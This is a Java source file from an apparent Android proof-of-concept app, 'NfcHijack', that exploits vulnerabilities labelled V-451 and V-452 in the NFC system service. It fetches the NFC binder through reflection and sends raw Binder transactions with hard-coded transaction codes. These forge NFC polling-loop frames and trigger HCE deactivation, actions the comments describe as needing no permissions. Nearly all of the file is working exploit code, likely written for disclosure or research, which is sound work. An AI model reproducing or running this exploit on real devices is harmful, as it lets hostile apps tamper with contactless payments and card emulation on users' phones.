package com.poc.nfchijack;

import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import java.lang.reflect.Method;

/**
 * V-451/V-452 PoC: Direct Binder transact calls to NfcService.
 *
 * On Android 15+, INfcAdapter is in the NFC mainline module's bootclasspath.
 * App processes cannot load INfcAdapter$Stub for asInterface(), so we use
 * raw IBinder.transact() with the correct transaction codes extracted from
 * the framework-nfc.jar DEX.
 *
 * Transaction codes (from framework-nfc.jar on Pixel 10 / Android 16 CP1A.260405.005):
 *   TRANSACTION_notifyPollingLoop = 48 → actual code = 48 + FIRST_CALL_TRANSACTION(1) = 49
 *   TRANSACTION_notifyHceDeactivated = 49 → actual code = 49 + FIRST_CALL_TRANSACTION(1) = 50
 *
 * Wait — AIDL static fields store the value as (index), and the actual wire code is
 * FIRST_CALL_TRANSACTION + index. BUT the 'service call' utility adds FIRST_CALL_TRANSACTION
 * automatically? No — 'service call nfc 49' worked, meaning the static field value IS the
 * wire transaction code. Let me verify: FIRST_CALL_TRANSACTION = 1, so if the field is 49,
 * the wire code is 49. The AIDL-generated code uses: Stub.TRANSACTION_xxx which equals
 * IBinder.FIRST_CALL_TRANSACTION + N where N is the 0-based method index.
 * So field value 49 = FIRST_CALL_TRANSACTION(1) + 48 = 49. The wire code IS 49.
 */
public class ReflectionHelper {
    private static final String TAG = "NfcHijack";
    private static final String DESCRIPTOR = "android.nfc.INfcAdapter";

    // Transaction codes from framework-nfc.jar (Android 16 / CP1A.260405.005)
    private static final int TRANSACTION_notifyPollingLoop = 48;
    private static final int TRANSACTION_notifyHceDeactivated = 49;

    private static IBinder sNfcBinder;

    /**
     * Get the raw NFC service binder.
     */
    public static IBinder getNfcAdapterBinder() {
        if (sNfcBinder != null) return sNfcBinder;

        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            sNfcBinder = (IBinder) getService.invoke(null, "nfc");
            if (sNfcBinder != null) {
                Log.i(TAG, "Got NFC binder via ServiceManager.getService(\"nfc\")");
                return sNfcBinder;
            }
        } catch (Exception e) {
            Log.w(TAG, "ServiceManager path failed: " + e.getMessage());
        }

        Log.e(TAG, "Failed to get NFC binder");
        return null;
    }

    /**
     * Get the INfcAdapter interface proxy via asInterface.
     * This may fail on mainline NFC builds where the Stub class is not in app classpath.
     * Falls back to raw binder if needed.
     */
    public static Object getNfcAdapterInterface() {
        IBinder binder = getNfcAdapterBinder();
        if (binder == null) return null;

        // Try standard asInterface first
        try {
            Class<?> stubClass = Class.forName("android.nfc.INfcAdapter$Stub");
            Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
            Object iface = asInterface.invoke(null, binder);
            if (iface != null) {
                Log.i(TAG, "Got INfcAdapter via Stub.asInterface");
                return iface;
            }
        } catch (Exception e) {
            Log.w(TAG, "Stub.asInterface failed (expected on mainline): " + e.getMessage());
        }

        // Return the raw binder — caller should use transact methods
        Log.i(TAG, "Using raw binder (mainline NFC module detected)");
        return binder;
    }

    /**
     * V-452: Call notifyHceDeactivated() via raw transact.
     * ZERO permission required — this is the vulnerability.
     */
    public static boolean callNotifyHceDeactivated() {
        IBinder binder = getNfcAdapterBinder();
        if (binder == null) return false;

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            // notifyHceDeactivated() takes no arguments
            boolean result = binder.transact(TRANSACTION_notifyHceDeactivated, data, reply, 0);
            if (result) {
                try {
                    reply.readException();
                } catch (Exception ex) {
                    Log.e(TAG, "notifyHceDeactivated threw: " + ex.getMessage());
                    return false;
                }
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "notifyHceDeactivated transact failed: " + e.getMessage());
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * V-451: Call notifyPollingLoop(PollingFrame) via raw transact.
     * ZERO permission required — this is the vulnerability.
     *
     * PollingFrame serialization: writeToParcel calls toBundle() then Parcel.writeBundle().
     * Bundle keys:
     *   "android.nfc.cardemulation.TYPE" → int
     *   "android.nfc.cardemulation.GAIN" → int (byte-cast)
     *   "android.nfc.cardemulation.DATA" → byte[]
     *   "android.nfc.cardemulation.TIMESTAMP" → long
     *   "android.nfc.cardemulation.TRIGGERED_AUTOTRANSACT" → boolean
     */
    public static boolean callNotifyPollingLoop(int type, byte[] frameData, int gain) {
        IBinder binder = getNfcAdapterBinder();
        if (binder == null) return false;

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);

            // readTypedObject reads int (1=non-null), then CREATOR.createFromParcel
            // PollingFrame.writeToParcel calls toBundle() then Parcel.writeBundle()
            data.writeInt(1); // non-null marker for readTypedObject

            Bundle frameBundle = new Bundle();
            frameBundle.putInt("android.nfc.cardemulation.TYPE", type);
            if (gain != -1) {
                frameBundle.putInt("android.nfc.cardemulation.GAIN", (byte) gain);
            }
            frameBundle.putByteArray("android.nfc.cardemulation.DATA", frameData);
            frameBundle.putLong("android.nfc.cardemulation.TIMESTAMP", System.nanoTime() / 1000);
            frameBundle.putBoolean("android.nfc.cardemulation.TRIGGERED_AUTOTRANSACT", false);
            data.writeBundle(frameBundle);

            boolean result = binder.transact(TRANSACTION_notifyPollingLoop, data, reply, 0);
            if (result) {
                try {
                    reply.readException();
                } catch (Exception ex) {
                    Log.e(TAG, "notifyPollingLoop threw: " + ex.getMessage());
                    return false;
                }
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "notifyPollingLoop transact failed: " + e.getMessage());
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * V-456: Set preferred HCE service.
     * Uses the public CardEmulation API (requires foreground + NFC permission).
     */
    public static boolean callSetPreferredService(android.content.ComponentName service) {
        // This requires CardEmulation interface — handled via public API in MainActivity
        Log.w(TAG, "setPreferredService should be called via CardEmulation public API");
        return false;
    }
}
